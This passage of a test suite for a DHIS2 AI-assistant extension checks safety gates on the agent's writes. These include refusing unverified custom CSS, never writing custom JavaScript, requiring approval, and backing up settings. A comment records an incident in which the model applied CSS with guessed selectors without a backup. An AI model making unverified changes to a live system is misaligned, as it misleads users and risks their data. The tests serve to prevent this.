    const F = 'filter=Zj7UnCAulEk.eMyVanycQSC:GE:2020-01-01:LE:2020-03-31';
    const noTime = h(`analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&stage=Zj7UnCAulEk&${F}`);
    const same = h(`analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&stage=Zj7UnCAulEk&startDate=2020-01-01&endDate=2020-03-31&${F}`);
    const wide = h(`analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&stage=Zj7UnCAulEk&startDate=1900-01-01&endDate=2100-12-31&${F}`);
    const plain = h('analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&stage=Zj7UnCAulEk');
    truthy('a date-field range with no time opens the event-date window (DHIS2 answered no rows, 13,426 with it); the same quarter as event dates gets the drop-out note; a wide window or no date field gets neither',
      /startDate=1900-01-01&endDate=2100-12-31/.test(noTime.path) && /window was opened/.test(noTime.notes.join(' '))
      && same.path.includes('startDate=2020-01-01') && /EVENT date is outside the window/.test(same.notes.join(' '))
      && !wide.notes.length && !/1900/.test(plain.path) && /last 12 months/.test(plain.notes.join(' ')));
    const wideOk = h(`analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd&stage=Zj7UnCAulEk&startDate=2000-01-01&endDate=${new Date().getFullYear()}-11-26&${F}`);
    truthy('…a deliberately wide window (2000 to this year) gets no note', !wideOk.notes.length);
    const rows = [['2018-01-07 00:00:00.0', 'ImspTQPwCqd', '1'], ['2019-11-02 00:00:00.0', 'ImspTQPwCqd', '5'], ...Array.from({ length: 14 }, (_, k) => [`2020-0${1 + (k % 3)}-${String(10 + k).padStart(2, '0')} 00:00:00.0`, 'ImspTQPwCqd', '100']), ['', 'ImspTQPwCqd', '9']];
    const pm = ctx.perMonthTotalsOfDateColumn({ headers: [{ name: 'Zj7UnCAulEk.msodh3rEMJa' }, { name: 'ou' }, { name: 'value' }], rows });
    truthy('counts grouped by a date field get per-month totals (the first months are not hidden by the 2020 bulk), with records that have no date apart',
      pm && pm.first_month === '2018-01' && pm.per_month['2019-11'] === 5 && pm.per_month['2020-01'] === 500 && pm.without_a_date === 9
      && ctx.perMonthTotalsOfDateColumn({ headers: [{ name: 'pe' }, { name: 'value' }], rows: rows.map((r) => [r[0], r[2]]) }) === null);
    truthy('…and the notes reach the model even when the path is unchanged', /if \(Array\.isArray\(peOuHeal\.notes\)\) queryNotes\.push/.test(require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'tools-metadata.js'), 'utf8')));
  }

  {
    const st = ctx.healStageParamWithItem('analytics/events/aggregate/eBAyeGv0exc?dimension=ou:ImspTQPwCqd;LEVEL-2&stage=Zj7UnCAulEk.eMyVanycQSC&startDate=2024-01-01');
    const ok1 = ctx.healStageParamWithItem('analytics/events/aggregate/eBAyeGv0exc?stage=Zj7UnCAulEk&dimension=Zj7UnCAulEk.eMyVanycQSC');
    truthy('stage=<stage>.<dataElement> (409 "Program stage is specified but does not exist") is sent as stage=<stage>, with how to count by the element; a plain stage is left alone',
      st.healed && /&stage=Zj7UnCAulEk&/.test(st.path) && /dimension=Zj7UnCAulEk\.eMyVanycQSC/.test(st.note) && !ok1.healed);
    const sp = vm.runInContext('buildSystemPrompt.toString()', ctx) + require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'registry.js'), 'utf8');
    truthy('on a cloud model the prompt and the app manual say the privacy block covers only the model\'s reads, so a requested record-level app is built in full (Haiku shipped an "aggregate-only version")',
      /This limits only YOUR reads: an app or plugin you build reads the records/.test(sp) && /never ship an "aggregate-only version"/.test(sp));
  }

  {
    const kitMeta = vm.runInContext('typeof CUSTOM_APP_KIT_META !== "undefined" ? CUSTOM_APP_KIT_META : null', ctx) || (ctx.__kitMeta || null);
    const lintOf = (src) => { try { return ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, 'app', kitMeta).warnings.map((w) => w.message).join(' | '); } catch (e) { return `threw ${e.message}`; } };
    const typed = lintOf("const { useState } = React; const App = () => { const [ou, setOu] = useState(''); return <label>Facility or district (UID) <input value={ou} onChange={(e) => setOu(e.target.value.trim())} /></label>; };");
    const tree = lintOf("const { useState } = React; const { OrganisationUnitTree } = D2UI; const App = () => { const [paths, setPaths] = useState([]); return <OrganisationUnitTree roots={['ImspTQPwCqd']} selected={paths} onChange={(u) => setPaths(u.selected)} />; };");
    const header = lintOf("const A = () => { const cols = [{ label: 'Facility', key: 'id' }]; return <p title=\"District\">{cols.length}</p>; };");
    truthy('an app where the org unit is TYPED as an id gets a warning naming OrganisationUnitTree and the several-units form; a tree picker and a plain "Facility" table column do not',
      /chosen by typing its id/.test(typed) && /one or more/.test(typed) && !/chosen by typing its id/.test(tree) && !/chosen by typing its id/.test(header));
  }

  // The loop: twelve failing analytics queries and one organisationUnits read in ONE message.
  const d = ctx.__dhis2();
  const savedD = { base: d.baseUrl, connected: d.connected, apiVersion: d.apiVersion, pageContext: d.pageContext };
  Object.assign(d, { baseUrl: 'https://dhis.invalid', connected: true, apiVersion: 43, pageContext: { appType: 'Dashboard' } });
  vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' }; conversationHistory = [];`, ctx);
  const enc = new TextEncoder();
  const sse = (obj) => `data: ${JSON.stringify({ choices: [{ index: 0, ...obj }] })}\n\n`;
  const months = Array.from({ length: 12 }, (_, i) => `2026-${String(i + 1).padStart(2, '0')}`);
  const batch = [
    ...months.map((mo, i) => ({ index: i, id: `q${i}`, type: 'function', function: { name: 'dhis2_query', arguments: JSON.stringify({ path: `analytics/events/aggregate/eBAyeGv0exc?stage=Zj7UnCAulEk&dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT&filter=Zj7UnCAulEk.fWIAEtYVEGk:EQ:${mo}` }) } })),
    { index: 12, id: 'q12', type: 'function', function: { name: 'dhis2_query', arguments: JSON.stringify({ path: 'organisationUnits?filter=level:eq:2&fields=id,name' }) } },
  ];
  const script = [
    sse({ delta: { tool_calls: batch }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'tool_calls' }),
    sse({ delta: { content: 'Here is what I found.' }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'stop' }),
  ];
  const events = []; const ran = []; let n = 0;
  ctx.broadcast = (x) => events.push(x);
  ctx.executeTool = async (name, args) => {
    ran.push(args.path);
    return /^analytics/.test(args.path) ? { _error: 'DHIS2 API 409: Query item or filter is invalid', _status: 409, _url: args.path } : { organisationUnits: [{ id: 'aaaaaaaaaaa', name: 'District' }] };
  };
  ctx.fetch = async (url) => {
    if (!String(url).startsWith('https://llm.invalid')) return new Response('{"version":"2.43"}', { status: 200, headers: { 'Content-Type': 'application/json' } });
    const body = script[Math.min(n++, script.length - 1)];
    return new Response(new ReadableStream({ start(c) { c.enqueue(enc.encode(`${body}data: [DONE]\n\n`)); c.close(); } }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
  };
  const savedWarn = console.warn; const savedLog = console.log; console.warn = () => {}; console.log = () => {};
  try {
    await ctx.runAgenticLoop('How many admissions per month are there in program eBAyeGv0exc (stage Zj7UnCAulEk, admission date fWIAEtYVEGk)?', null, false);
  } catch (e) { /* judged below */ } finally { console.warn = savedWarn; console.log = savedLog; }
  ctx.executeTool = saved.exec; ctx.fetch = saved.fetch; ctx.broadcast = saved.broadcast;
  Object.assign(d, savedD);
  vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG }; conversationHistory = [];`, ctx);
  const done = events.filter((e) => e.type === 'AI_TOOL_DONE' && e.tool === 'dhis2_query');
  truthy(`twelve calls in one message are one attempt: the lane stops after three errors, dhis2_query stays on, and the unrelated organisationUnits read in the same message runs [ran ${ran.length}, disabled ${done.filter((e) => /disabled|switched off/.test(e.summary || '')).length}]`,
    ran.filter((p) => /^analytics/.test(p)).length === 3 && ran.some((p) => /^organisationUnits/.test(p))
    && !done.some((e) => /disabled|switched off/.test(e.summary || '')));
}

// Transfer thread (2026-11-26, local 2.42.5.1): asked to hide Capture's Transfer
// action, the model wrote custom CSS with eleven guessed selectors ("I could not
// verify the selectors … It may hide nothing … I can't promise which"), offered
// it, applied it on "yes", and took no backup. The user's rule: the assistant
// never tries what it does not know works — in general, not for this case.
async function runNoGuessChecks() {
  console.log('\nNo guesses: unverified changes are neither offered nor made; system settings and metadata imports are backed up:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const P = ctx.unverifiedChangePhrase;
  const proposal = 'Proposed change. I could not verify the selectors. I can\'t read Capture\'s compiled JS bundle through the API, so I don\'t know its exact data-test attribute. It may hide nothing, or it may hide the item — I can\'t promise which until you look. If you want it, reply "yes, apply the CSS".';
  const flagged = [
    proposal,
    'I guessed the option code for "Referred", so this may or may not work.',
    'These are plausible endpoints for the import; try it and see.',
    'This may or may not work on 2.40.',
    'I\'m guessing the attribute name here.',
  ];
  const honest = [
    '**Not verified on live data**\n- Q1 2020 totals. Patient-level reads are blocked on this model, so no figure the app shows has been checked against records.',
    'These test the logic, not live data. I have not cross-checked these against an independent count.',
    'I could not verify that the app works on real records: please click through these three steps.',
    'I never guess selectors: the hook below was read from the app code.',
    'The install check passed. What I could not verify: the plugin running inside a real form with real values.',
    // Independent review (2026-11-26): ordinary build talk that the first version blocked.
    'To avoid guessing the IDs, let me look them up.',
    'Instead of guessing the field names, I\'ll read the structure.',
    'I don\'t want to guess the UIDs.',
    'That would be guessing, so let me check the schema.',
    'This may not work on 2.40, so I\'ll check the version first.',
    'I can\'t guarantee that the analytics tables are up to date.',
    'Let me preview the app to see if it works.',
    'I couldn\'t check the tracked entity attributes yet.',
    'I won\'t guess the selectors.',
  ];
  truthy('guessing language about a change is caught in any domain (selectors, option codes, endpoints, settings, attribute names)', flagged.every((t) => P(t)));
  truthy('…honest reporting of what was not checked, and "never guess", are not', honest.every((t) => !P(t)));
  const haikuOptions = '**Options:**\n1. **Hide the whole stage with a program rule** (`HIDEPROGRAMSTAGE`). This is the verified route, but in the new Capture app it only disables adding events.\n2. **Try a CSS-only custom form on the Transfer stage.** This would write a custom form to the stage. It would not remove the dashboard button, so it may not solve your problem.\n\nWhich would you like?';
  const buildReport = '**Please test by hand**\n1. Kenya, 1 January to 31 March 2020: compare the admissions card with a daily admissions count.\n2. Click **No discharge date**: each row should carry the flag.\n\n**Not verified on live data**\n- **District plus facility counting.** Records are de-duplicated by event ID in the code, but this has not been tested on live data.\n\n**Options:**\n1. **Build an aggregate-only version now.** It would show monthly counts. It would not include a median.';
  truthy('an offered OPTION that is itself hedged ("Try a CSS-only custom form … may not solve your problem") is caught; test steps, limits and a plain option are not',
    /Try a/.test(ctx.unverifiedOptionIn(haikuOptions) || '') && ctx.unverifiedOptionIn(buildReport) === null && /guessing/.test(ctx.unverifiedChangePhrase('Writing CSS without checking would be guessing.') || ''));
  truthy('…the Transfer proposal is an offer to the user; a build report is not', ctx.offersChangeToUser(proposal) && !ctx.offersChangeToUser(honest[0]));
  truthy('"place it" / "place the plugin" authorise the write the chatbot asked for; "the plugin was placed in the wrong section" stays a report',
    ['place it', 'place the plugin in the Installation summary section', 'yes place it'].every((t) => ctx.classifyWriteAuthorization(t).scope !== 'read_only')
    && ctx.classifyWriteAuthorization('the plugin was placed in the wrong section, why?').scope === 'read_only');
  truthy('only SHORT approvals count as a yes to the previous proposal ("yes", "yes place it", "go ahead", "ok"); "try again" and longer requests are new requests',
    ['yes', 'yes place it', 'go ahead', 'ok', 'yes, apply the CSS'].every((t) => ctx.approvesPreviousProposal(t))
    && !['add a chart of admissions by month to the dashboard', 'try again', 'ok now make a line list of the cases by district', 'please add the indicator to the dashboard and the map'].some((t) => ctx.approvesPreviousProposal(t)));
  truthy('a normal next-steps list ("1. Try adding a map …") is not an unverified option',
    ctx.unverifiedOptionIn('Next steps you could take:\n1. Try adding a map of cases by district.\n2. Add a line list.') === null);

  // Custom CSS / JS: what the write is, and the refusals when no app loads it.
  const W = ctx.customUiWriteOf;
  truthy('custom CSS/JS writes are recognised in every form (settings map, settings/<key>, files/style), clearing is not one',
    W('POST', 'systemSettings', { keyCustomCss: 'a{}' })?.kind === 'css' && W('POST', 'systemSettings/keyCustomJs', 'alert(1)')?.kind === 'js'
    && W('POST', 'files/style', '.x{}')?.kind === 'css' && W('POST', 'systemSettings', { keyCustomCss: '' }) === null && W('GET', 'systemSettings/keyCustomCss') === null
    && W('POST', 'systemSettings', { keyApplicationTitle: 'x' }) === null);
  truthy('hooks are read from selectors, not from declarations',
    JSON.stringify(ctx.cssHookTokens('/* c */ [data-test="widget-enrollment-actions-transfer"], li[data-test*="transfer" i], #main .menu-item > a { display: none; color: #fff }').sort())
      === JSON.stringify(['main', 'menu-item', 'transfer', 'widget-enrollment-actions-transfer'].sort()));
  const savedF = ctx.safeDhis2Fetch; const savedFetch = ctx.fetch; const saved_exec = ctx.executeTool; const saved_bc = ctx.broadcast;
  const pages = { 'https://dhis.invalid/dhis-web-capture': '<html><script src="./assets/main.js"></script></html>', 'https://dhis.invalid/api/apps/legacy': '<html><link href="../api/files/style"><script src="app.js"></script></html>' };
  const code = { 'https://dhis.invalid/dhis-web-capture/assets/main.js': 'dataTest:"widget-enrollment-actions-transfer"', 'https://dhis.invalid/api/apps/legacy/app.js': 'className:"menu-item"' };
  let appList = [{ key: 'capture', baseUrl: 'https://dhis.invalid/dhis-web-capture' }];
  ctx.safeDhis2Fetch = async (p) => (p === 'apps' ? appList : { _error: 'x' });
  ctx.fetch = async (url) => {
    const u = String(url).replace(/\/index\.html\?redirect=false$/, '');
    const t = pages[u] ?? code[url];
    return t == null ? new Response('nf', { status: 404 }) : new Response(t, { status: 200 });
  };
  try {
    const none = await ctx.customUiWriteRefusal('POST', 'systemSettings', { keyCustomCss: '[data-test="widget-enrollment-actions-transfer"] { display: none }' });
    truthy('a stylesheet no app loads is refused — even with the RIGHT selector — and the refusal says to offer nothing unverified',
      none && none._scope === 'unverified_change' && /no app on this server loads the custom CSS/.test(none._error) && /Do not offer this/.test(none._hint));
    const js = await ctx.customUiWriteRefusal('POST', 'systemSettings/keyCustomJs', 'document.title = 1');
    truthy('custom JavaScript is never written', js && /never writes it/.test(js._error));
    appList = [...appList, { key: 'legacy', baseUrl: 'https://dhis.invalid/api/apps/legacy' }];
    const guessed = await ctx.customUiWriteRefusal('POST', 'systemSettings', { keyCustomCss: '.menu-item, [data-test="transfer-menu-item"] { display: none }' });
    const real = await ctx.customUiWriteRefusal('POST', 'systemSettings', { keyCustomCss: '.menu-item { color: red }' });
    truthy('when an app does load it, a hook that exists in no such app is refused by name; one that exists goes through',
      guessed && /transfer-menu-item/.test(guessed._error) && !/menu-item,/.test(guessed._error) && real === null);
    const cleared = await ctx.customUiWriteRefusal('POST', 'systemSettings', { keyCustomCss: '' });
    truthy('clearing the custom CSS is always allowed', cleared === null);
  } finally { ctx.safeDhis2Fetch = savedF; ctx.fetch = savedFetch; }

  // System settings backup and restore.
  truthy('the settings a write changes are read from its path or body',
    JSON.stringify(ctx.systemSettingsWriteKeys('POST', 'systemSettings', { keyCustomCss: 'x', keyStyle: 'y' })) === '["keyCustomCss","keyStyle"]'
    && JSON.stringify(ctx.systemSettingsWriteKeys('DELETE', 'systemSettings/keyCustomCss')) === '["keyCustomCss"]' && ctx.systemSettingsWriteKeys('GET', 'systemSettings') === null);
  const store = {}; const writes = [];
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    if (/^dataStore\/dhis2-ai-extension-backups\//.test(p) && o.method === 'POST') { store[decodeURIComponent(p.split('/').pop())] = o.body; return { ok: true }; }
    if (/^dataStore\/dhis2-ai-extension-backups\//.test(p)) return store[decodeURIComponent(p.split('/').pop())] || { _error: 'nf', _status: 404 };
    if (p === 'systemSettings/keyCustomCss' && !o.method) return { keyCustomCss: '' };
    if (p === 'systemSettings/keyStyle' && !o.method) return { _error: 'nf', _status: 404 };
    if (o.method) { writes.push(`${o.method} ${p} ${JSON.stringify(o.body || '')}`); return { ok: true }; }
    return { _error: 'x' };
  };
  try {
    const b = await ctx.backupSystemSettings(['keyCustomCss', 'keyStyle'], 'POST systemSettings');
    const saved = store[b.block?.key];
    truthy('a system-settings write is backed up first (old values, a missing one as null) with a restore hint',
      b.ok && saved && saved.system_settings.values.keyCustomCss === '' && saved.system_settings.values.keyStyle === null && /manage_backups\(action="restore"/.test(b.block.restore_hint));
    const r = await ctx.restoreFromBackup(b.block.key);
    truthy('…and manage_backups restore puts the old values back (a setting that did not exist is removed)',
      r.success && writes.some((w) => /^POST systemSettings \{"keyCustomCss":""\}/.test(w)) && writes.some((w) => /^DELETE systemSettings\/keyStyle/.test(w)));
  } finally { ctx.safeDhis2Fetch = savedF; }
  {
    const st2 = {}; const w2 = [];
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (/^dataStore\/dhis2-ai-extension-backups\//.test(p) && o.method === 'POST') { st2[decodeURIComponent(p.split('/').pop())] = o.body; return { ok: true }; }
      if (/^dataStore\/dhis2-ai-extension-backups\//.test(p)) return st2[decodeURIComponent(p.split('/').pop())] || { _error: 'nf', _status: 404 };
      if (p === 'systemSettings/keyEmailPassword' && !o.method) return { keyEmailPassword: '' };
      if (o.method) { w2.push(`${o.method} ${p}`); return { ok: true }; }
      return { _error: 'x' };
    };
    try {
      const b2 = await ctx.backupSystemSettings(['keyEmailPassword'], 'POST systemSettings');
      const r2 = await ctx.restoreFromBackup(b2.block.key);
      truthy('a confidential setting (reads back empty) is never "restored" or removed from its unreadable backup', r2.success && r2.skipped.includes('keyEmailPassword') && !w2.some((w) => /keyEmailPassword/.test(w)));
    } finally { ctx.safeDhis2Fetch = savedF; }
    vm.runInContext('lastUserText = "Please save this CSS: .login-banner { color: red }";', ctx);
    const mine = await ctx.customUiWriteRefusal('POST', 'systemSettings', { keyCustomCss: '.login-banner { color: red }' });
    vm.runInContext('lastUserText = "";', ctx);
    truthy('a stylesheet the user pasted themselves is theirs to save (no check)', mine === null);
  }
  const src = require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'tools-metadata.js'), 'utf8');
  truthy('user accounts and tracker records are never snapshotted into the backup namespace', /users\|userCredentials\|trackedEntityInstances/.test(src));
  truthy('dhis2_query backs up system settings, objects a POST /metadata changes (new-only imports keep no backup), and any metadata type the schema list knows',
    /systemSettingsWriteKeys\(method, safePath, args\.body\)/.test(src) && /operation: 'metadata_import'/.test(src) && /every\(\(o\) => o\.not_found_at_snapshot\)/.test(src) && /resolveSchemaType\(itemMatch\[1\]\)/.test(src));

  // The loop: a "yes" to an unverified proposal runs nothing; an answer offering one is sent back.
  const d = ctx.__dhis2();
  const savedD = { base: d.baseUrl, connected: d.connected, apiVersion: d.apiVersion, pageContext: d.pageContext, writeAuth: d.writeAuth };
  Object.assign(d, { baseUrl: 'https://dhis.invalid', connected: true, apiVersion: 42, pageContext: { appType: 'Capture' } });
  vm.runInContext(`_cachedApiKey = 'verify-key'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
  const enc = new TextEncoder();
  const sse = (obj) => `data: ${JSON.stringify({ choices: [{ index: 0, ...obj }] })}\n\n`;
  const call = (name, a) => sse({ delta: { tool_calls: [{ index: 0, id: `c${Math.random().toString(36).slice(2, 7)}`, type: 'function', function: { name, arguments: JSON.stringify(a) } }] }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'tool_calls' });
  const say = (t) => sse({ delta: { content: t }, finish_reason: null }) + sse({ delta: {}, finish_reason: 'stop' });
  const turn = async (script, userText, history) => {
    vm.runInContext(`conversationHistory = ${JSON.stringify(history || [])};`, ctx);
    const events = []; const ran = []; const requests = []; let n = 0;
    ctx.broadcast = (x) => events.push(x);
    ctx.executeTool = async (name, a) => { ran.push(`${name} ${a.method || a.action || ''} ${a.path || ''}`); return { success: true }; };
    ctx.fetch = async (url, o) => {
      if (!String(url).startsWith('https://llm.invalid')) return new Response('{"version":"2.42"}', { status: 200, headers: { 'Content-Type': 'application/json' } });
      requests.push(JSON.parse(o.body));
      const body = script[Math.min(n++, script.length - 1)];
      return new Response(new ReadableStream({ start(c) { c.enqueue(enc.encode(`${body}data: [DONE]\n\n`)); c.close(); } }), { status: 200, headers: { 'Content-Type': 'text/event-stream' } });
    };
    const sl = console.log; const sw = console.warn; console.log = () => {}; console.warn = () => {};
    let res = null; try { res = await ctx.runAgenticLoop(userText, null, false); } catch (e) { res = { thrown: String(e) }; } finally { console.log = sl; console.warn = sw; }
    return { res, events, ran, requests };
  };
  const POSTCSS = { method: 'POST', path: 'systemSettings', body: { keyCustomCss: '.x{display:none}' } };
  try {
    const hist = [{ role: 'user', content: 'try it with css now' }, { role: 'assistant', content: proposal }];
    const yes = await turn([call('dhis2_query', POSTCSS), say('I did not apply it: it could not be verified.')], 'yes', hist);
    truthy('"yes" to a proposal the model called unverified runs nothing: the write is refused in code',
      !yes.ran.some((r) => /^dhis2_query POST/.test(r)) && yes.events.some((e) => e.type === 'AI_TOOL_DONE' && /described as unverified/.test(e.summary || '')));
    const fine = await turn([call('dhis2_query', { method: 'POST', path: 'systemSettings', body: { keyApplicationTitle: 'Cold chain' } }), say('Done.')], 'yes', [{ role: 'user', content: 'rename the application title to Cold chain' }, { role: 'assistant', content: 'I will set the application title to "Cold chain". Shall I?' }]);
    truthy('…a "yes" to a proposal with no guess in it runs as before', fine.ran.some((r) => /^dhis2_query POST systemSettings/.test(r)));
    const offer = await turn([say(proposal), say('There is no verified way to hide it: I checked the program schema and the roles, and none controls it.')], 'can you hide the transfer option here?', []);
    truthy('an answer offering an unverified change is sent back once and rewritten without it',
      offer.events.some((e) => e.type === 'AI_THINKING' && /Removing unverified suggestions/.test(e.label || '')) && /no verified way/.test(offer.res?.text || '')
      && offer.requests.length === 2 && offer.requests[1].messages.some((m) => m.role === 'system' && /never present a guess as an option/.test(m.content)));
    const sp = vm.runInContext('buildSystemPrompt.toString()', ctx) + require('fs').readFileSync(require('path').join(__dirname, '..', 'src', 'registry.js'), 'utf8');
    truthy('the system prompt carries the no-guess rule for changes and for facts', /HARD RULE — NO GUESSES/.test(sp) && /is stated only when a tool result in this conversation shows it/.test(sp));
  } finally {
    ctx.executeTool = saved_exec; ctx.fetch = savedFetch; ctx.broadcast = saved_bc;
    Object.assign(d, savedD);
    vm.runInContext(`_cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG }; conversationHistory = [];`, ctx);
  }
}

// setImmediate: a few checks are async (promise-returning safety gates); they
// resolve on the microtask queue, so the verdict must run after it drains.
setImmediate(async () => {
  if (loaded) await runStreamDropChecks().catch((e) => bad(`stream-drop checks threw: ${e && e.stack || e}`));
  if (loaded) { try { runStreamRetryChecks(); } catch (e) { bad(`stream-retry checks threw: ${e && e.stack || e}`); } }
  if (loaded) await runStreamRecoveryChecks().catch((e) => bad(`stream recovery checks threw: ${e && e.stack || e}`));
  if (loaded) await runLogEndpointChecks().catch((e) => bad(`log endpoint checks threw: ${e && e.stack || e}`));
  if (loaded) await runStatePersistenceChecks().catch((e) => bad(`state persistence checks threw: ${e && e.stack || e}`));
  if (loaded) await runPlacementChecks().catch((e) => bad(`placement checks threw: ${e && e.stack || e}`));
  if (loaded) await runSqlViewChecks().catch((e) => bad(`SQL view checks threw: ${e && e.stack || e}`));
  if (loaded) await runCustomAppChecks().catch((e) => bad(`custom-app checks threw: ${e && e.stack || e}`));
  if (loaded) await runCaptureRefreshChecks().catch((e) => bad(`Capture refresh checks threw: ${e && e.stack || e}`));
  if (loaded) await runRuleScopeAndTetSharingChecks().catch((e) => bad(`rule scope / TET sharing checks threw: ${e && e.stack || e}`));
  if (loaded) await runDashboardThreadChecks().catch((e) => bad(`dashboard-thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runSecurityReviewChecks().catch((e) => bad(`security-review checks threw: ${e && e.stack || e}`));
  if (loaded) await runDashboardLayoutChecks().catch((e) => bad(`dashboard layout checks threw: ${e && e.stack || e}`));
  if (loaded) await runDashboardMapsTurnChecks().catch((e) => bad(`dashboard maps-turn checks threw: ${e && e.stack || e}`));
  if (loaded) await runAppOrgUnitAndServerPinChecks().catch((e) => bad(`app org-unit / server-pin checks threw: ${e && e.stack || e}`));
  if (loaded) await runAppRequestRoutingChecks().catch((e) => bad(`app request routing checks threw: ${e && e.stack || e}`));
  if (loaded) await runAppScannerAndAnalyticsCacheChecks().catch((e) => bad(`app scanner / analytics cache checks threw: ${e && e.stack || e}`));
  if (loaded) await runStressThreadChecks().catch((e) => bad(`stress thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runMalariaThreadChecks().catch((e) => bad(`Malaria thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runAncAppThreadChecks().catch((e) => bad(`ANC app thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runMaternityThreadChecks().catch((e) => bad(`Maternity thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runDataQualityThreadChecks().catch((e) => bad(`data-quality thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runArgumentShapeThreadChecks().catch((e) => bad(`argument-shape thread checks threw: ${e && e.stack || e}`));
  if (loaded) await runComplexBuildsChecks().catch((e) => bad(`complex-builds checks threw: ${e && e.stack || e}`));
  if (loaded) await runInpatientAdmissionsChecks().catch((e) => bad(`Inpatient admissions checks threw: ${e && e.stack || e}`));
  if (loaded) await runNoGuessChecks().catch((e) => bad(`no-guess checks threw: ${e && e.stack || e}`));
  console.log('');
  if (loaded && !screenshotChecksDone) bad('screenshot checks never finished — a SCREENSHOT_* handler did not answer');
  if (loaded && !hardeningChecksDone) bad('hardening checks never finished — a handler did not answer');
  if (failures) { console.error(`\x1b[31mFAILED\x1b[0m — ${failures} check(s) failed\n`); process.exit(1); }
  console.log('\x1b[32mAll checks passed.\x1b[0m\n');
});
